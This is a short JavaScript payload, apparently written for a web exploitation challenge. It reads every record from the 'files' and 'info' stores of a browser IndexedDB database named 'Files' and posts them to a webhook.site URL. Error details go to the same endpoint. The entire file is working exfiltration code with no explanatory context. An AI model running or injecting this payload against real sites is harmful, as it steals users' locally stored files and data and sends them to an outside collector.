WEBHOOK = "https://webhook.site/22adc411-5a6c-4d97-87b6-8c2f641bdb6c";

function post(url, data) {
  let xhr = new XMLHttpRequest();
  xhr.open("POST", url, true);
  return xhr.send(JSON.stringify(data));
}

(async () => {
  const request = indexedDB.open("Files", 1);
  request.onsuccess = async () => {
    const db = request.result;

    const readStore = (storeName) => {
      return new Promise((resolve, reject) => {
        try {
          const tx = db.transaction(storeName, "readonly");
          const store = tx.objectStore(storeName);
          const req = store.getAll();
          req.onsuccess = () => resolve(req.result);
          req.onerror = () => reject(req.error);
        } catch (error) {
          post(WEBHOOK + "?error", { ...error, storeName });
        }
      });
    };

    const files = await readStore("files");
    const info = await readStore("info");

    console.log("=== IndexedDB Dump ===");
    console.log("Files Store:", files);
    console.log("Info Store:", info);

    post(WEBHOOK + "?success", files);
    post(WEBHOOK + "?success", info);
  };
  request.onerror = (event) => {
    console.error("Why didn't you allow my web app to use IndexedDB?!");

    post(WEBHOOK + "?error", event);
  };
})();
